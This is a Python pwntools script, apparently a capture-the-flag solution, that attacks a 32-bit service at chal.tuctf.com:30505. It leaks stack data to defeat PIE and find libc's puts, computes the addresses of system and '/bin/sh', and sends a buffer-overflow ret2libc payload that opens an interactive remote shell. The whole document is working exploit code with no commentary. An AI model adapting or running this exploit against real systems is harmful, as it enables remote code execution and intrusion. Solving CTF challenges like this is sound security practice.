from pwn import *
import struct
import re

def recvall(conn):
	msg = b''
	while True:
		try:
			new_block = conn.recv(timeout=1)
			if new_block == b'':
				break
			msg += new_block	
		except EOFError as e:
			break
	return msg

def ret_to_main(pie_base_addr, conn):

	payload = b'a'*0x2c
	payload += struct.pack("<I", pie_base_addr + 0x11b9)

	log.info("Sending payload to ret_main.")
	log.info("Payload length : {}".format(hex(len(payload))))

	conn.send(payload)


HOST = "chal.tuctf.com"
PORT = 30505


conn = remote(HOST, PORT)

msg = conn.recvline()
msg = conn.recvline()
msg = conn.recvline()

payload = b"a"*0x4

conn.send(payload)

#msg = recvall(conn)
msg = conn.recvline()
#recvall(conn)

msg = msg[10+len(payload):]
msg = msg[:-2]

print(msg)
print(len(msg))

leaks = re.findall(".{4}",msg)
print(leaks)

pie_base_addr = struct.unpack("<I",bytes(leaks[2]))[0] - 0x12ab
buffer_addr = struct.unpack("<I",bytes(leaks[0]))[0] 

read_plt = pie_base_addr + 0x4000 + 0xc

msg = recvall(conn)
print(msg)
ret_to_main(pie_base_addr,conn)

msg = recvall(conn)
print(msg)
ret_to_main(pie_base_addr,conn)

msg =recvall(conn)
print(msg)
#conn.interactive()

#############NEW PAYLOAD#############
# Getting a libc.so inst addr (puts)

payload = b'a'*0x20

recvall(conn)

conn.send(payload)

msg = conn.recvline()
leaks = re.findall(".{4}",msg)

print(leaks)

leak_libc_inst_puts = struct.unpack("<I",bytes(leaks[10]))[0]

system_addr = leak_libc_inst_puts - 0x24f00
bin_sh_addr = leak_libc_inst_puts + 0xfbd6b

msg = recvall(conn)
print(msg)
ret_to_main(pie_base_addr,conn)

msg =recvall(conn)
print(msg)
ret_to_main(pie_base_addr,conn)

recvall(conn)

payload = b'b'*0x10
conn.send(payload)

msg = conn.recvline()
leaks = re.findall(".{4}",msg)

print(leaks)

unknown1 = struct.unpack("<I",bytes(leaks[13]))[0]

payload = b'a'*0x2c
payload += struct.pack("<I",system_addr)
payload += b'\xff'*4
payload += struct.pack("<I",bin_sh_addr)

#payload = b'a'*0x2c
#payload += struct.pack("<I", leak_libc_inst_puts)
#payload += b'\xff'*4
#payload += struct.pack("<I", pie_base_addr + 0x4000 + 0x18)


conn.send(payload)
msg = recvall(conn)
print(msg)

conn.send(payload)
#msg = recvall(conn)
#log.info(msg)
#print(hex(struct.unpack("<I",bytes(msg[:4]))[0]))

conn.interactive()

conn.close()




